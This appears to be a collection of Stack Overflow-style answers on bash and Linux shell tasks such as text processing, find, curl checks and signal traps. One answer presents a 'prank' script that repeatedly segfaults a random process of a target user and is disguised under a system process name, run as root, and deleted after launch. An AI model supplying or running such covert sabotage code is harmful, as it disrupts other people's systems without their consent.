    "Default values for environment variables in .npmrc": "Looks like it's not supported. One way of doing what you want is to write a wrapper script around npm:\n~/bin/npm:\n#!/bin/sh\ndefaultRegistry=https://myregistry.com\nmyRegistry=${myEnvVariable:-$defaultRegistry}\nexport myRegistry\nexec /usr/bin/npm \"$@\"\n~/.npmrc:\nregistry=${myRegistry}\nThen of course, prepend $HOME/bin to PATH in your ~/.bash_profile. Ubuntu does this automatically in the .profile it adds for new users.\n[[ :$PATH: = *:$HOME/bin:* ]] || echo 'PATH=~/bin:$PATH' >> ~/.bash_profile\nTest opening up a new shell and typing type -p npm to make sure it's finding the one in ~/bin/npm.\n.npmrc support for environment variables\nThe npmrc man page does not mention support for the shell-specific conditional logic, so unfortunately it doesn't seem like it's supported (not yet anyway as of v10):\nAll npm config files are an ini-formatted list of key = value parameters. Environment variables can be replaced using ${VARIABLE_NAME}. For example:\nprefix = ${HOME}/.npm-packages",
    "Pymongo significantly slower than mongo shell?": "There can be one or more of the following reasons that can lead to such behavior.\nThe load on the database at the time of query execution and the sequence in which you are performing these 2 operations can greatly impact the response time for the queries. For example - if you query using pymongo first, it's possible that WiredTiger loads the data from disk. While executing the same query from mongo shell, data is already present in WiredTiger cache(because of the first query made using pymongo).\nWhen querying database with pymongo client, the first request is usually very slow compared to the subsequent requests. You can check it out yourself by doing something like this -\n db = pymongo.MongoClient()['my_db']\n result = list(db['my_collection'].find(my_query))\n #make another query returning same amount of data\n result_2 = list(db['my_collection'].find(my_query_2))\nYou will find that \"result\" will take comparatively more time than \"result_2\". So the execution time for the first request is usually high and not reliable for performance analysis.\nAs you have already mentioned, parsing and converting mongo documents to python objects will also take some time.",
    "find and remove files with space using find command on Linux": "I'd do it this way:\nfind . -iname 'thumbs.db' -exec rm -rfv {} +\nThis way, it still works even if your directories contain whitespace in their names.",
    "Change user password with one Bash command line": "echo 'user:passwd' | sudo chpasswd\nThis helped me.",
    "UNIX shell written in a reasonable language? [closed]": "Eshell is a Bash-like shell in Emacs Lisp.\nIPython can be used as a system shell, though the syntax is a bit weird (supporting all of Python plus basic sh constructs).\nfish has a core written in C, but much of its functionality is implemented in itself. Unlike many rare shells, it can be used as your login shell.\nHotwire deserves another mention. Its basic design appears to be \"PowerShell in Python,\" but it also does some clever things with UI. The last release was in 2008.\nZoidberg is written in Perl and uses Perl syntax. A nice-looking project, shame it seems to have stalled.\nScsh would be a pain to use as a login shell (an example command from the docs: (run/strings (find \".\" -name *.c -print))), but it looks like a good \"Perl in Scheme.\"",
    "Convert KB To MB using Bash": "You can do it with shell builtins\nsome_command | while read KB dummy;do echo $((KB/1024))MB;done\nHere is a more useful version:\n#!/bin/sh\nhuman_print(){\nwhile read B dummy; do\n  [ $B -lt 1024 ] && echo ${B} bytes && break\n  KB=$(((B+512)/1024))\n  [ $KB -lt 1024 ] && echo ${KB} kilobytes && break\n  MB=$(((KB+512)/1024))\n  [ $MB -lt 1024 ] && echo ${MB} megabytes && break\n  GB=$(((MB+512)/1024))\n  [ $GB -lt 1024 ] && echo ${GB} gigabytes && break\n  echo $(((GB+512)/1024)) terabytes\ndone\n}\n\necho 120928312 http://blah.com | human_print",
    "How to read multi-line input in a Bash script? [closed]": "You just have to decide how much to read.\nIf this is the only input, you could read until end of file. This is how most UNIX utilities work:\n#!/bin/bash\necho \"Pipe in certificate, or paste and it ctrl-d when done\"\nkeyvariable=$(cat)\nIf you want to continue reading things later in the script, you can read until you see a blank line:\n#!/bin/bash\necho \"Paste certificate and end with a blank line:\"\nkeyvariable=$(sed '/^$/q')\nIf you want it to feel more like magic interactively, you could read until the script has gone two seconds without input:\n#!/bin/bash\necho \"Paste your certificate:\"\nIFS= read -d '' -n 1 keyvariable   \nwhile IFS= read -d '' -n 1 -t 2 c\ndo\n    keyvariable+=$c\ndone\necho \"Thanks!\" ",
    "getting a previous date in bash/unix": "try this:\ndate --date=\"yesterday\" +%Y/%m/%d",
    "How to check if a server is running": "I'ld recommend not to use only ping. It can check if a server is online in general but you can not check a specific service on that server.\nBetter use these alternatives:\ncurl\nman curl\nYou can use curl and check the http_response for a webservice like this\ncheck=$(curl -s -w \"%{http_code}\\n\" -L \"${HOST}${PORT}/\" -o /dev/null)\nif [[ $check == 200 || $check == 403 ]]\nthen\n    # Service is online\n    echo \"Service is online\"\n    exit 0\nelse\n    # Service is offline or not working correctly\n    echo \"Service is offline or not working correctly\"\n    exit 1\nfi\nwhere\nHOST = [ip or dns-name of your host]\n(optional )PORT = [optional a port; don't forget to start with :]\n200 is the normal success http_response\n403 is a redirect e.g. maybe to a login page so also accetable and most probably means the service runs correctly\n-s Silent or quiet mode.\n-L Defines the Location\n-w In which format you want to display the response\n-> %{http_code}\\n we only want the http_code\n-o the output file\n-> /dev/null redirect any output to /dev/null so it isn't written to stdout or the check variable. Usually you would get the complete html source code before the http_response so you have to silence this, too.\nnc\nman nc\nWhile curl to me seems the best option for Webservices since it is really checking if the service's webpage works correctly,\nnc can be used to rapidly check only if a specific port on the target is reachable (and assume this also applies to the service).\nAdvantage here is the settable timeout of e.g. 1 second while curl might take a bit longer to fail, and of course you can check also services which are not a webpage like port 22 for SSH.\nnc -4 -d -z -w 1 ${HOST} ${PORT} &> /dev/null\nif [[ $? == 0 ]]\nthen\n    # Port is reached\n    echo \"Service is online!\"\n    exit 0\nelse\n    # Port is unreachable\n    echo \"Service is offline!\"\n    exit 1\nfi\nwhere\nHOST = [ip or dns-name of your host]\nPORT = [NOT optional the port]\n-4 force IPv4 (or -6 for IPv6)\n-d Do not attempt to read from stdin\n-z Only listen, don't send data\n-w timeout\nIf a connection and stdin are idle for more than timeout seconds, then the connection is silently closed. (In this case nc will exit 1 -> failure.)\n(optional) -n If you only use an IP: Do not do any DNS or service lookups on any specified addresses, hostnames or ports.\n&> /dev/null Don't print out any output of the command",
    "How to check file owner in linux": "Use = not == for comparison. The test(1) man page says:\nSTRING1 = STRING2\n        the strings are equal\nI'd also recommend using stat to find out the owner instead of some ls hacks. Some double quotes and an extra x would also be nice.\n#!/bin/bash\nuname2=\"$(stat -c '%U' \"$1\")\"  # change this if not using Linux\nif [ \"x${uname2}\" = \"x${USER}\" ]; then\n    echo owner\nelse\n    echo no owner\nfi\nIf you're using GNU coreutils, you can replace stat -c with stat --format to make the script more readable. If you're using FreeBSD, NetBSD, OpenBSD or DragonFly you need to replace it with stat -f.",
    "Why must I source .bashrc every time I open terminal for aliases to work?": "It looks like your terminal emulator is launching bash as a login shell.\nIf that's the case, it will read /etc/profile for configuration as well as 1 of the following files, if they exist (listed in order of importance) :\n~/.bash_profile\n~/.bash_login\n~/.profile\nIt will thus ignore your .bashrc file. A correct fix for your situation would be to either configure your terminal emulator to run bash interactively and non-login, or add the following line to your ~/.bash_profile :\n[ -f \"$HOME/.bashrc\" ] && . \"$HOME/.bashrc\"\nHere is a link to the documentation about which files are loaded depending of the type of shell you are running",
    "Removing all spaces from the beginning of lines": "You can use this sed command to remove leading whitespace (spaces or tabs)\nsed 's/^[ \\t]*//' file \nUse sed -i to modify the file in-place.",
    "Bash Script - iterating over output of find": "folders=`foo`\nis always wrong, because it assumes that your directories won't contain spaces, newlines (yes, they're valid!), glob characters, etc. One robust approach (which requires the GNU extension -print0) follows:\nwhile IFS='' read -r -d '' filename; do\n  : # something with \"$filename\"\ndone < <(find . -maxdepth 1 -type d -print0)\nAnother safe and robust approach is to have find itself directly invoke your desired command:\nfind . -maxdepth 1 -type d -exec printf '%s\\n' '{}' +\nSee the UsingFind wiki page for a complete treatment of the subject.",
    "How to become a Jenkins user?": "",
    "Sorting unique by column - sort command?": "This might work for you:\nsort -uk1,1 file\nThis sorts the file on the first field only and removes duplicate lines based on the first field.",
    "cat /dev/null to multiple files to clear existing files like logs": "Hard coded solutions\ntee\nEcho nothing and simply send it to multiple files using the tee command.\nLike this:\n$ echo -n | tee file1 file2 file3 file4 file5\nAll files in that list will be empty and created if they don't exist.\nApplied to your answer this would be:\n$ cat /dev/null | tee fileABC fileXYZ\nWhile echo -n is considered better practice than cat /dev/null, an even better solution would be to use printf '', as noted by Charles Duffy. Resulting in following command:\n$ printf '' | tee file1 file2 file3 \ntruncate\nAs answered by skrilled, truncate is probably the solution you were originally looking for. The command allows arbitrarily many file name arguments to be supplied. You can easily use it as follows:\n$ truncate --size 0 file1 file2 file3 file4 file5\nWhich allows you to achieve your goal without using any pipe and in a single command, pretty nifty answer supplied here by skrilled.\nStructural file names solution\nIf all files have a structure on their names (for instance\njava\nfiles) and location you could use the find command. In the following example I will apply the erasure to all .java and .c source files in the current directory and in all directories inside the current directory.\n$ find . -maxdepth 2 -type f -name '*.java' -exec truncate --size 0 \"{}\" \\; \nExplained:\nfind . execute find in current directory .\n-maxdepth 2 recursion level, descend to directories in directory but no further (level 2). Set this to 1 to not descend or n to descend n times.\n-type f only apply to files, not directories\n-name '*.java' only apply to files ending in .java\n-exec truncate --size 0 \"{}\" \\; truncate each file found (file name is stored in {})\nSee man find for more options and a more detailed explanation. Be sure to check it out because find is one of the most powerful tools for automation of file editing.\nList of files in separate file solution\nThe easiest thing to do might be to store the files to erase in a file, line by line. If there is no obvious structure with respect to their location and name, that is.\nSay the files are stored in a file called erasure.\n$ cat erasure\nfileABC\nfileXYZ\ndir/anotherFile\nIn this example we will erase three files, which are listed above.\n$ while read file; do > \"$file\"; done < erasure\nExplanation:\nwhile read file for each line in the given file, store the line in variable file\ndo > \"$file\" empty the file and output nothing in it (i.e. erase it)\ndone < erasure specify the input file using < (redirection)\nNote: while this method preserves spaces in the path, it fails to handle backslashes and trailing white space, as noted by Charles Duffy. One way to fix both issues is to modify the loop as follows:\nwhile IFS= read -r file; do > \"$file\"; done < erasure\nYet newlines in file names will still be a problem. The only way around this issue is to separate the file names using null termination (\\0). The correct loop now becomes:\nwhile IFS= read -r -d '' file; do > \"$file\"; done < erasure",
    "SMB Client Commands Through Shell Script": "I worked out a solution to this, and sharing for future references.\n#!/bin/bash\ncd /home/username\nsmbclient //link/to/server$ password -W domain -U username << SMBCLIENTCOMMANDS\nrecurse\nprompt\nmput backupfiles\nexit\nSMBCLIENTCOMMANDS\nThis will enter the commands between the two SMBCLIENTCOMMANDS statements into the smb terminal.",
    "Linux - Save only recent 10 folders and delete the rest": "There you go. (edited)\nls -dt */ | tail -n +11 | xargs rm -rf\nFirst list directories recently modified then take all of them except first 10, then send them to rm -rf.",
    "Get a list of function names in a shell script [duplicate]": "You can get a list of functions in your script by using the grep command on your own script. In order for this approach to work, you will need to structure your functions a certain way so grep can find them. Here is a sample:\n$ cat my.sh\n#!/bin/sh\n\nfunction func1() # Short description\n{\n    echo func1 parameters: $1 $2\n}\n\nfunction func2() # Short description\n{\n    echo func2 parameters: $1 $2\n}\n\nfunction help() # Show a list of functions\n{\n    grep \"^function\" $0\n}\n\nif [ \"_$1\" = \"_\" ]; then\n    help\nelse\n    \"$@\"\nfi\nHere is an interactive demo:\n$ my.sh \nfunction func1() # Short description\nfunction func2() # Short description\nfunction help() # Show a list of functions\n\n\n$ my.sh help\nfunction func1() # Short description\nfunction func2() # Short description\nfunction help() # Show a list of functions\n\n\n$ my.sh func1 a b\nfunc1 parameters: a b\n\n$ my.sh func2 x y\nfunc2 parameters: x y\nIf you have \"private\" function that you don't want to show up in the help, then omit the \"function\" part:\nmy_private_function()\n{\n    # Do something\n}",
    "Ruby, which exception is best to handle unset environment variables?": "You can do something like:\nENV['SECRET_KEY_XXYY'] || raise('no SECRET_KEY_XXYY provided')",
    "Read HTTP output using shell/bash script": "Curl or wget are obviously better for the job but for the record bash and Unix standard commands (cat & printf) can do the job.\nksh introduced shell network internal handling and this has been adopted by bash.\n#!/bin/bash\n\nexec 5<> /dev/tcp/myhost.com/80\ncat <&5 &\nprintf \"GET /getuser/Default.aspx?username=b772643 HTTP/1.0\\r\\n\\r\\n\" >&5",
    "PHP sudo in shell_exec": "",
    "Generate random float number in given specific range of numbers using Bash": "If you have GNU coreutils available, you could go with:\nseq 0 .01 1 | shuf | head -n1\nWhere 0 is the start (inclusive), .01 is the increment, and 1 is the end (inclusive).",
    "Linux shell scripting: hex number to binary string": "echo \"ibase=16; obase=2; 5F\" | bc",
    "running adb devices showing unauthorized device?": "",
    "Why is my bash string comparison of two identical strings always false?": "You have to put spaces around operators:\nif [[ \"$a\" != \"$b\" ]]; then ...\nWithout spaces you end up with a single string, equivalent to \"$a!=$b\". And testing just a string returns true if that string is non-empty...",
    "How can I cut(1) camelcase words?": "sed 's/\\([A-Z]\\)/ \\1/g'\nCaptures each capital letter and substitutes a leading space with the capture for the whole stream.\n$ echo \"aCertainCamelCasedWord\" | sed 's/\\([A-Z]\\)/ \\1/g'\na Certain Camel Cased Word",
    "Sed to extract text between two strings": "sed -n '/^START=A$/,/^END$/p' data\nThe -n option means don't print by default; then the script says 'do print between the line containing START=A and the next END.\nYou can also do it with awk:\nA pattern may consist of two patterns separated by a comma; in this case, the action is performed for all lines from an occurrence of the first pattern though an occurrence of the second.\n(from man awk on Mac OS X).\nawk '/^START=A$/,/^END$/ { print }' data\nGiven a modified form of the data file in the question:\nSTART=A\n  xxx01\n  xxx02\nEND\nSTART=A\n  xxx03\n  xxx04\nEND\nSTART=A\n  xxx05\n  xxx06\nEND\nSTART=B\n  xxx07\n  xxx08\nEND\nSTART=A\n  xxx09\n  xxx10\nEND\nSTART=C\n  xxx11\n  xxx12\nEND\nSTART=A\n  xxx13\n  xxx14\nEND\nSTART=D\n  xxx15\n  xxx16\nEND\nThe output using GNU sed or Mac OS X (BSD) sed, and using GNU awk or BSD awk, is the same:\nSTART=A\n  xxx01\n  xxx02\nEND\nSTART=A\n  xxx03\n  xxx04\nEND\nSTART=A\n  xxx05\n  xxx06\nEND\nSTART=A\n  xxx09\n  xxx10\nEND\nSTART=A\n  xxx13\n  xxx14\nEND\nNote how I modified the data file so it is easier to see where the various blocks of data printed came from in the file.\nIf you have a different output requirement (such as 'only the first block between START=A and END', or 'only the last ...'), then you need to articulate that more clearly in the question.",
    "disk usage issue with rsync and --link-dest": "When you ran rsync -avh --link-dest=full orig/ orig_1, you ignored this error message (it's more obvious if you remove -v):\n--link-dest arg does not exist: full\nIf we then take a look at man rsync under --link-dest, we find:\nIf DIR is a relative path, it is relative to the destination directory. \nAnd there it is. full is relative to the current directory. Relative to the destination directory, it would be ../full.\nIf you try again with rsync -avh --link-dest=../full orig/ orig_1, you get what you expect:\n$ du -sh *\n149M    full\n149M    orig\n232K    orig_1\n$ du -sh .\n298M    .\nNote that, when counted individually, the directories still appear take up the full space:\n$ du -sh orig_1 \n149M    orig_1\nThis is because du keeps track of files it's already seen, and avoids counting them twice.",
    "How to stop infinite loop in bash script gracefully?": "You could trap a signal, say SIGUSR1:\necho \"My pid is: $$\"\nfinish=0\ntrap 'finish=1' SIGUSR1\n\nwhile (( finish != 1 ))\ndo\n    stuff\n    sleep 42\ndone\nThen, when you want to exit the loop at the next iteration:\nkill -SIGUSR1 pid\nWhere pid is the process-id of the script. If the signal is raised during the sleep, it will wake (sleep sleeps until any signal occurs).",
    "Why is an empty loop invalid in shell script?": "Another option is just to set a NOP(no op) which is basically, do nothing.\nIn bash, the equivalent for a NOP is :.\nwhile true; do\n  :\ndone",
    "Parsing XML and replacing specific elements or attribute values via shell script": "Update value with xmllint in file.xml:\nxmllint --shell file.xml << EOF\ncd /studentFile/student[studentName='CLASSA']/studentActions/studentAction[studentType='Juniour']/studentStatus\nset failed\nsave\nEOF\nor without here document:\necho -e \"cd /studentFile/student[studentName='CLASSA']/studentActions/studentAction[studentType='Juniour']/studentStatus\\nset failed\\nsave\" | xmllint --shell file.xml\nUpdate: With bash and XML in a variable:\nxml=$(xmllint --shell <(echo \"$xml\") << EOF\ncd /studentFile/student[studentName='CLASSA']/studentActions/studentAction[studentType='Juniour']/studentStatus\nset failed\nsave -\nEOF\n)\nor without here document:\nxml=$(echo -e \"cd /studentFile/student[studentName='CLASSA']/studentActions/studentAction[studentType='Juniour']/studentStatus\\nset failed\\nsave -\" | xmllint --shell <(echo \"$xml\"))",
    "new to Bash - keep getting Illegal option error": "In getopts you not specify p option you only have f:d:s:m: options.\nI think you mean p instead m or vice versa.\nIt should f:d:s:m:p: or f:d:s:p:",
    "Create PostgreSQL backup files with timestamp": "Try this:\npg_dump prod-db -U postgres > prod-db-$(date +%d-%m-%y).sql\nHere's the date manual, for other format options.",
    "Shell scripting using grep to split a string": "Using substitution with sed:\necho $myVAR | sed -E  's/(.*)#{3}(.*)/\\1/'\n>>> firstword\n\necho $myVAR | sed -E  's/(.*)#{3}(.*)/\\2/'\n>>> secondword\n\n# saving to variables\nmyFIRST=$(echo $myVAR | sed -E  's/(.*)#{3}(.*)/\\1/')\n\nmySECOND=$(echo $myVAR | sed -E  's/(.*)#{3}(.*)/\\2/')",
    "coffeescript install": "If you want to access coffescript binary globally, you need to install it so:\nnpm install -g coffee-script\nAnd then add the installation directory to your PATH. Good way to automate this is to use nvm.",
    "How to concatenate stdin in to a pipe?": "Close.\n{ gen_input ; cat ; } | parse_input_and_stdin",
    "Why doesn't the cut command work for a \"docker image ls\" command?": "Because you have several \" \" between each data.\nEasier way is to strip whitespaces to a single space and cut:\ndocker image ls | grep name1 | tr -s ' ' | cut -d \" \" -f 3\nEDIT: chepner's answer is to prefere, but I let this one live since original question was \"why\".",
    "Sending and receiving SMS by command line with Huawei E3131 and HiLink on a debian system": "3 steps are necessary:\nGet session id\nGet token\nSend / receive sms\nStep 1 - Get session id\nFor getting the session id I use the following command in an own shell script:\n#!/bin/bash\n\ncurl -b session.txt -c session.txt http://192.168.8.1/html/index.html > /dev/null 2>&1\nStep 2 - Get token\nFor getting the token I use the following commands, also in an own shell script:\n#!/bin/bash\n\nTOKEN=$(curl -s -b session.txt -c session.txt http://192.168.8.1/html/smsinbox.html)\nTOKEN=$(echo $TOKEN | cut -d'\"' -f 10)\n\necho $TOKEN > token.txt\nStep 3 Part A - Send SMS\nFinally a third shell script for sending the sms, which also invokes the two other scripts:\n#!/bin/bash\n\nNUMBER=$1\nMESSAGE=$2\n\n./session.sh\n./token.sh\n\nLENGTH=${#MESSAGE}\nTIME=$(date +\"%Y-%m-%d %T\")\nTOKEN=$(<token.txt)\n\nSMS=\"<request><Index>-1</Index><Phones><Phone>$NUMBER</Phone></Phones><Sca/><Content>$MESSAGE</Content><Length>$LENGTH</Length><Reserved>1</Reserved><Date>$TIME</Date></request>\"\n\necho $SMS\n\ncurl -v -b session.txt -c session.txt -H \"X-Requested-With: XMLHttpRequest\" --data \"$SMS\" http://192.168.8.1/api/sms/send-sms --header \"__RequestVerificationToken: $TOKEN\" --header \"Content-Type:text/xml\"\nUsage is:\ncommand phonenumber \"text\"\nStep 3 Part B - Receive SMS\nAnd for receiving the last unread sms (or, if not avaiable, the last read sms) I use the following script:\n#!/bin/bash\n\n./session.sh\n./token.sh\n\nTOKEN=$(<token.txt)\n\nDATA=\"<request><PageIndex>1</PageIndex><ReadCount>1</ReadCount><BoxType>1</BoxType><SortType>0</SortType><Ascending>0</Ascending><UnreadPreferred>1</UnreadPreferred></request>\"\n\ncurl -b session.txt -c session.txt -H \"X-Requested-With: XMLHttpRequest\" --data \"$DATA\" http://192.168.8.1/api/sms/sms-list --header \"__RequestVerificationToken: $TOKEN\" --header \"Content-Type:text/xml\"\nThis is maybe not very good coding, but it works.",
    "How to print float value from binary file in shell?": "This doesn't use Python and is a widely-used external tool, Perl.\nperl -e \"print pack('d>',0.123)\" > file.bin\n\nperl -e \"print unpack('d>',<>)\" < file.bin\n0.123\nOr you can use GNU od utility, e.g.:\nod -tfD file.bin\n0000000                    0.123\n0000010\nWhere -t parameter specifies the output format for floating-point number (f) followed by optional size specifier (F for float, D for double or L for long double), in short -tfD can be replaced by -e or -F. To print only value without address, -A n can be specified.",
    "Connect to bluetooth device (iPhone) via command line on MacOSX": "This answer is very similar to @Wolph's answer; however after fighting other issues this is what I came up with. I like it better for two reasons: # It will not disconnect the device if it is already connected # Nice output from osascript\nJust save it in a file and call osascript path/to/file.applescript\nThis was working on OSX Mavericks 10.9.2 as of 11-Apr-2014, although you may need to grant access to whatever method you use to run this in the security preferences panel. See this Apple KB: http://support.apple.com/kb/HT5914\nAll you should have to do is change the \"LG HBS730\" string to match the name of your device and you should be set. The returns are there so you get nice output from osascript.\nactivate application \"SystemUIServer\"\ntell application \"System Events\"\n  tell process \"SystemUIServer\"\n    -- Working CONNECT Script.  Goes through the following:\n    -- Clicks on Bluetooth Menu (OSX Top Menu Bar)\n    --    => Clicks on LG HBS730 Item\n    --      => Clicks on Connect Item\n    set btMenu to (menu bar item 1 of menu bar 1 where description is \"bluetooth\")\n    tell btMenu\n      click\n      tell (menu item \"LG HBS730\" of menu 1)\n        click\n        if exists menu item \"Connect\" of menu 1\n          click menu item \"Connect\" of menu 1\n          return \"Connecting...\"\n        else\n          click btMenu -- Close main BT drop down if Connect wasn't present\n          return \"Connect menu was not found, are you already connected?\"\n        end if\n      end tell\n    end tell\n  end tell\nend tell",
    "Is It Possible to Create CSV File with Multiple Tabs in Command Prompt? [closed]": "Asking excel to save a multiple-sheet workbook as CSV got me this error message:\nSo, no, not possible.",
    "What are some interesting shell scripts? [closed]": "Here's a fun prank\n#!/bin/bash\nuser=$1\nwhile true ; do\n    kill -SEGV $(ps -u $user -o pid= | random | tail -n 1)\n    sleep $RANDOM\ndone\nEvery few minutes a program owned by $user will segfault. Best if run as root and given an innocent name, but running it as $user works as well. Save the script as e.g. \"xterm\" or \"kded\" or \"gnome-session\", chmod a+x the script, and then invoke it like this:\n$scriptname $username 2>/dev/null 1>&2 & disown $scriptname ; rm $scriptname\nThis will teach your friends not to leave their systems unlocked. This implementation uses random from bsdgames, but you could do the selection another way.",
    "A Bash script to check if a string is present in a comma separated list of strings": "You could use globs:\n[[ \",$x,\" = *\",$y,\"* ]]",
    "Use GREP on array to find words": "The simplest solution would be to pipe the array elements into grep:\nprintf -- '%s\\n' \"${foo[@]}\" | grep spi\nA couple of notes:\nprintf is a bash builtin, and you can look it up with man printf. The -- option tells printf that whatever follows is not a command line option. That guards you from having strings in the foo array being interpreted as such.\nThe notation of \"${foo[@]}\" expands all the elements of the array as standalone arguments. Overall the words in the array are put into a multi-line string and are piped into grep, which matches every individual line against spi.",
    "QProcess and shell : Destroyed while process is still running": "process.waitForFinished(); is hitting the default 30 seconds timeout. Use process.waitForFinished(-1); instead. This will make sure you wait for however long it takes for the process to finish, without any timeout.",
    "Rename file by removing url parameter in linux": "for file in *.zip\\?*; do mv \"$file\" \"${file%%\\?*}\"; done\nAs far as I can tell, there's no option to wget telling it not to include the query string in the local filename. You can use the -O option to specify an explicit filename, and fix the driver script to remove the query string itself.",
    "Store PostgreSQL query result to Shell or PostgreSQL variable": "No, no, no! Use \"raw data\" switch from psql, like \"-t\" or \"\\t\" and pipe the query to psql instead of parsing ascii-table, come on :-)\necho 'select * from myvalue;' | psql -t -h host -U user -d db\nIf you really need parse psql output, you could also use -H switch ( turns on HTML output ), and parse it with some perl module for parsing html tables, I used that once or twice.. Also, you may want to use a pgpass file and ~/.psqlrc for some defaults, like default DB to connect, when not specified.",
    "Monitor folder for new files using unix ksh shell script or perl script and trigger perl script": "Check incron. It seems to do exactly what you need.",
    "os.system() execute command under which linux shell?": "Was just reading Executing BASH from Python, then 17.1. subprocess \u2014 Subprocess management \u2014 Python v2.7.3 documentation, and I saw the executable argument; and it seems to work:\n$ python\nPython 2.7.1+ (r271:86832, Sep 27 2012, 21:16:52) \n[GCC 4.5.2] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import os\n>>> print os.popen(\"echo $0\").read()\nsh\n>>> import subprocess\n>>> print subprocess.call(\"echo $0\", shell=True).read()\n/bin/sh\n>>> print subprocess.Popen(\"echo $0\", stdout=subprocess.PIPE, shell=True).stdout.read()\n/bin/sh\n>>> print subprocess.Popen(\"echo $0\", stdout=subprocess.PIPE, shell=True, executable=\"/bin/bash\").stdout.read()\n/bin/bash\n>>> print subprocess.Popen(\"cat <(echo TEST)\", stdout=subprocess.PIPE, shell=True).stdout.read()\n/bin/sh: Syntax error: \"(\" unexpected\n>>> print subprocess.Popen(\"cat <(echo TEST)\", stdout=subprocess.PIPE, shell=True, executable=\"/bin/bash\").stdout.read()\nTEST\nHope this helps someone,\nCheers!",
    "bash shell reworking variable replace dots by underscore": "Let's create your variables:\n$ VERSIONNUMBER=v0.9.3-beta\n$ VERSIONNUMBERNAME=${VERSIONNUMBER:1}\nThis form only replaces the first occurrence of .:\n$ echo \"${VERSIONNUMBERNAME/./_}\"\n0_9.3-beta\nTo replace all occurrences of ., use:\n$ echo \"${VERSIONNUMBERNAME//./_}\"\n0_9_3-beta\nBecause this approach avoids the creation of pipelines and subshells and the use of external executables, this approach is efficient. This approach is also unicode-safe.\nDocumentation\nFrom man bash:\n${parameter/pattern/string}\nPattern substitution. The pattern is expanded to produce a pattern just as in pathname expansion. Parameter is expanded and the longest match of pattern against its value is replaced with string. If pattern begins with /, all matches of pattern are replaced with string. Normally only the first match is replaced. If pattern begins with #, it must match at the beginning of the expanded value of parameter. If pattern begins with %, it must match at the end of the expanded value of parameter. If string is null, matches of pattern are deleted and the / following pattern may be omitted. If the nocasematch shell option is enabled, the match is performed without regard to the case of alphabetic characters. If parameter is @ or *, the substitution operation is applied to each positional parameter in turn, and the expansion is the resultant list. If parameter is an array variable subscripted with @ or *, the substitution operation is applied to each member of the array in turn, and the expansion is the resultant list. (Emphasis added.)",
    "Using tail -F to see a file changing in real-time": "Use this command.\nwatch tail -n 1 log.txt",
    ".zshrc config file syntax error": "Remove the spaces from your alias command. The correct syntax is\neeyore% alias g2sites = \"cd /Users/MYNAME/Dropbox/Development\"\nzsh: bad assignment\neeyore% alias g2sites=\"cd /Users/MYNAME/Dropbox/Development\" \neeyore% ",
    "Bash: How to compare arguments with if statement?": "[ is a test command, so you need a space between [ and \"$1\", as well as a space between \"1\" and the closing ]\nEdit\nJust to clarify, the space is needed because [ is a different syntax of the test bash command, so the following is another way of writing the script:\n#!/bin/bash\n\nif test \"$1\" == \"1\"\nthen\n        echo $1\nelse\n        echo \"no\"\nfi\nWhich can be further simplified to\n#!/bin/bash\n[ \"$1\" == \"1\" ] && echo \"$1\" || echo \"no\"",
    "How to compare versions of some products in unix ksh shell?": "Pure Bash / Ksh:\ncompareVersions ()\n{\n  typeset    IFS='.'\n  typeset -a v1=( $1 )\n  typeset -a v2=( $2 )\n  typeset    n diff\n\n  for (( n=0; n<4; n+=1 )); do\n    diff=$((v1[n]-v2[n]))\n    if [ $diff -ne 0 ] ; then\n      [ $diff -le 0 ] && echo '-1' || echo '1'\n      return\n    fi\n  done\n  echo  '0'\n} # ----------  end of function compareVersions  ----------",
    "How to resume an ftp download at any point? (shell script, wget option)?": "Use wget with:\n-c option\nExtracted from man pages:\n-c / --continue\nContinue getting a partially-downloaded file. This is useful when you want to finish up a download started by a previous instance of Wget, or by another program. For instance:\n               wget -c ftp://sunsite.doc.ic.ac.uk/ls-lR.Z\nIf there is a file named ls-lR.Z in the current directory, Wget will assume that it is the first portion of the remote file, and will ask the server to continue the retrieval from an offset equal to the length of the local file.",
    "How to prevent a user from using ctrl-c to stop a script?": "You can always trap SIGINT:\ntrap 'echo got SIGINT' INT\nOnce you're done, reinstall the default handler again with\ntrap INT\nSee the POSIX spec for trap for details. This works in all Bourne shells, not just bash.\nNote that while Bash accepts SIGINT for the signal name, many Bourne shells require the name to be just INT.",
    "'Rscript' is not recognized as an internal or external command, operable program or batch file": "",
    "How do I run two commands in a single line for loop in bash? [closed]": "You need a ; after your brace expansion. You have it in the simple example, but not in the \"broken\" one:\nfor i in {1..100}; do printf %s \"$(date)\" ; mysql -uroot -e \"SHOW SLAVE STATUS\\G\" | grep \"Seconds_Behind_Master\" ; sleep 10 ; done\n                 ^ this one",
    "Bash for loop with spaces": "COMMANDS=(\"ls /\" \"df ~\" \"du -hs ~/Devel/\")\nfor i in \"${COMMANDS[@]}\"; do \n  echo \"$i\"\ndone\nThis uses an array to store the commands. This feature is also available in ksh, zsh, but not in sh.\nArrays behave like the \"$@\" argument array. Applying a for loop on \"${ARRAY_NAME[@]}\" (the quotes are important) will give you each item in succession. If you omit the quotes, it'll all get smushed together and split on the separators present in your IFS environment variable ('\\t', '\\n' and ' ' by default).",
    "How do I find all files that do not begin with a given prefix in bash?": "If you're doing subdirectories as well:\nfind . ! -name \"bar_*\"\nOr, equivalently,\nfind . -not -name \"bar_*\"",
    "Sub-shell differences between bash and ksh": "In ksh, a subshell might or might not result in a new process. I don't know what the conditions are, but the shell was optimized for performance on systems where fork() was more expensive than it typically is on Linux, so it avoids creating a new process whenever it can. The specification says a \"new environment\", but that environmental separation may be done in-process.\nAnother vaguely-related difference is the use of new processes for pipes. In ksh and zsh, if the last command in a pipeline is a builtin, it runs in the current shell process, so this works:\n$ unset x\n$ echo foo | read x\n$ echo $x\nfoo\n$\nIn bash, all pipeline commands after the first are run in subshells, so the above doesn't work:\n$ unset x\n$ echo foo | read x\n$ echo $x\n\n$\nAs @dave-thompson-085 points out, you can get the ksh/zsh behavior in bash versions 4.2 and newer if you turn off job control (set +o monitor) and turn on the lastpipe option (shopt -s lastpipe). But my usual solution is to use process substitution instead:\n$ unset x\n$ read x < <(echo foo)\n$ echo $x\nfoo",
